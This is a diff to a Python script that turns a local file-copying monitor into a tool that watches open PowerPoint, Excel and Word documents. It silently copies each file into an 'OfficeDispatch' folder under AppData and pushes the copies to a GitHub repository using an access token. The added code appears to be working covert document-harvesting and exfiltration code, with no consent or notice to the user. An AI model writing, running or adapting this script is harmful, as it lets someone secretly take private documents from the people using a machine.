@@ -1,59 +1,159 @@
-# 导入所需的模块
-import os
-import time
-import shutil
-import datetime
 import win32com.client
 import xlwings as xw
+import os
+import shutil
+import datetime
+import time
+import hashlib
+from github import Github
 
-excel_path = xw.books.active.fullname
-excel_name = xw.books.active.name
+def initialize_com_object(app_name):
+    while True:
+        try:
+            app = win32com.client.Dispatch(app_name)
+            return app
+        except Exception as e:
+            print(f"Error initializing {app_name}: {e}. Retrying in 10 seconds...")
+            time.sleep(10)
 
-# 根据当前日期创建文件夹，格式是yyyy.mm.dd
-today = datetime.date.today()
-folder_name = today.strftime("%Y.%m.%d")
-if not os.path.exists(folder_name): # 检查文件夹是否已经存在
-    os.mkdir(folder_name) # 如果不存在则创建
+ppt = initialize_com_object("PowerPoint.Application")
+word = initialize_com_object("Word.Application")
 
-# 在目录下创建info.txt的文件
-info_file = open(os.path.join(folder_name, "info.txt"), "a") # 以追加模式打开，如果不存在则创建
+appdata_path = os.getenv('APPDATA')
+repo_path = os.path.join(appdata_path, "OfficeDispatch")
 
-# 在目录下创建log.txt的文件
-log_file = open(os.path.join(folder_name, "log.txt"), "a") # 以追加模式打开，如果不存在则创建
+os.makedirs(repo_path, exist_ok=True)
 
-# 监控powerpoint和excel打开文件的行为
-ppt = win32com.client.Dispatch("PowerPoint.Application")
-#excel = win32com.client.Dispatch("Excel.Application")
-ppt_files = set() # 用于存储已经打开过的ppt文件
-excel_files = set() # 用于存储已经打开过的excel文件
+processed_files = set()
+log_initialized = False
 
-while True: # 无限循环，直到用户退出程序
-    # 遍历当前打开的ppt文件
-    for presentation in ppt.Presentations:
-        #info_file.write("PPT_DETECTED")
-        file_name = presentation.FullName # 获取文件的完整路径和名称
-        if file_name not in ppt_files: # 如果是新打开的文件
-            ppt_files.add(file_name) # 将文件添加到集合中
-            file_size = os.path.getsize(file_name) # 获取文件的大小，单位是字节
-            try: # 尝试复制文件到创建的文件夹中
-                shutil.copy(file_name, folder_name)
-                info_file.write(f"{file_name} {file_size}\n") # 将文件名字+大小信息写入info.txt
-                log_file.write(f"{datetime.datetime.now()} Copied {file_name} successfully\n") # 将复制成功的时间和结果写入log.txt
-            except Exception as e: # 如果复制失败，捕获异常并记录原因
-                log_file.write(f"{datetime.datetime.now()} Failed to copy {file_name} due to {e}\n") # 将复制失败的时间和原因写入log.txt
+def log_message(message, log_file_path):
+    global log_initialized
+    if not log_initialized:
+        if os.path.exists(log_file_path) and os.path.getsize(log_file_path) > 0:
+            with open(log_file_path, 'a', encoding='utf-8') as log:
+                log.write('\n')
+        log_initialized = True
+    with open(log_file_path, "a", encoding='utf-8') as log_file:
+        log_file.write(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")
 
-    # 遍历当前打开的excel文件
-    def excel_embd():
-        if excel_path not in excel_files: # 如果是新打开的文件
-            excel_files.add(excel_path) # 将文件添加到集合中
-            file_size = os.path.getsize(excel_path) # 获取文件的大小，单位是字节
-            try: # 尝试复制文件到创建的文件夹中
-                shutil.copy(excel_path, folder_name)
-                info_file.write(f"{excel_path} {file_size}\n") # 将文件名字+大小信息写入info.txt
-                ### PDB
-                log_file.write(f"{datetime.datetime.now()} Copied {excel_path} successfully\n") # 将复制成功的时间和结果写入log.txt
-            except Exception as e: # 如果复制失败，捕获异常并记录原因
-                log_file.write(f"{datetime.datetime.now()} Failed to copy {excel_path} due to {e}\n") # 将复制失败的时间和原因写入log.txt
-    excel_embd()
-    # 每隔一秒检查一次是否有新打开的文件
-    time.sleep(1)
+def calculate_md5(file_path):
+    hash_md5 = hashlib.md5()
+    with open(file_path, "rb") as f:
+        for chunk in iter(lambda: f.read(4096), b""):
+            hash_md5.update(chunk)
+    return hash_md5.hexdigest()
+
+def copy_file(file_name, file_size, category, target_folder, log_file_path):
+    try:
+        dest_folder = os.path.join(target_folder, category)
+        dest_file_path = os.path.join(dest_folder, os.path.basename(file_name))
+        
+        if os.path.exists(dest_file_path) and calculate_md5(file_name) == calculate_md5(dest_file_path):
+            log_message(f"File {file_name} already exists and is identical, skipping copy", log_file_path)
+            return False
+        
+        shutil.copy(file_name, dest_folder)
+        log_message(f"Copied {file_name} to {dest_folder} successfully", log_file_path)
+        return True
+    except Exception as e:
+        log_message(f"Failed to copy {file_name} due to {e}", log_file_path)
+        return False
+
+def process_files():
+    log_file_path = None
+    try:
+        current_date = datetime.datetime.now().strftime("%Y.%m.%d")
+        target_folder = os.path.join(repo_path, current_date)
+
+        os.makedirs(os.path.join(target_folder, "PowerPoint"), exist_ok=True)
+        os.makedirs(os.path.join(target_folder, "Excel"), exist_ok=True)
+        os.makedirs(os.path.join(target_folder, "Word"), exist_ok=True)
+
+        log_file_path = os.path.join(target_folder, "log.txt")
+
+        new_files_detected = False
+
+        if ppt:
+            for presentation in ppt.Presentations:
+                file_name = presentation.FullName
+                if file_name not in processed_files:
+                    processed_files.add(file_name)
+                    file_size = os.path.getsize(file_name)
+                    if copy_file(file_name, file_size, "PowerPoint", target_folder, log_file_path):
+                        new_files_detected = True
+
+        try:
+            for book in xw.books:
+                file_name = book.fullname
+                if file_name not in processed_files:
+                    processed_files.add(file_name)
+                    file_size = os.path.getsize(file_name)
+                    if copy_file(file_name, file_size, "Excel", target_folder, log_file_path):
+                        new_files_detected = True
+        except Exception as e:
+            print("No Excel instances found: {e}")
+
+        if word:
+            for document in word.Documents:
+                file_name = document.FullName
+                if file_name not in processed_files:
+                    processed_files.add(file_name)
+                    file_size = os.path.getsize(file_name)
+                    if copy_file(file_name, file_size, "Word", target_folder, log_file_path):
+                        new_files_detected = True
+
+        return new_files_detected, target_folder, log_file_path
+    except Exception as e:
+        if log_file_path:
+            log_message(f"Error in processing files: {e}", log_file_path)
+        return False, None, None
+
+def upload_to_github(repo_name, commit_message, token, target_folder, log_file_path):
+    try:
+        g = Github(token)
+        user = g.get_user()
+        repo = user.get_repo(repo_name)
+        
+        commit_files = []
+        for root, dirs, files in os.walk(target_folder):
+            for file_name in files:
+                if file_name == "log.txt":
+                    continue
+                file_path = os.path.join(root, file_name)
+                with open(file_path, "rb") as file:
+                    content = file.read()
+                
+                rel_path = os.path.relpath(file_path, repo_path).replace("\\", "/")
+                try:
+                    existing_file = repo.get_contents(rel_path)
+                    repo.update_file(
+                        path=rel_path,
+                        message=commit_message,
+                        content=content,
+                        sha=existing_file.sha,
+                        branch="main"
+                    )
+                except:
+                    repo.create_file(
+                        path=rel_path,
+                        message=commit_message,
+                        content=content,
+                        branch="main"
+                    )
+                commit_files.append(rel_path)
+        
+        if commit_files:
+            log_message(f"Files uploaded to GitHub successfully: {', '.join(commit_files)}", log_file_path)
+    except Exception as e:
+        log_message(f"Failed to upload files to GitHub due to {e}", log_file_path)
+
+repo_name = "your_repo_name"
+commit_message = "your_commit_message"
+github_token = "enter_your_gitub_token_here"
+
+while True:
+    new_files_detected, target_folder, log_file_path = process_files()
+    if new_files_detected:
+        upload_to_github(repo_name, commit_message, github_token, target_folder, log_file_path)
+    time.sleep(30)
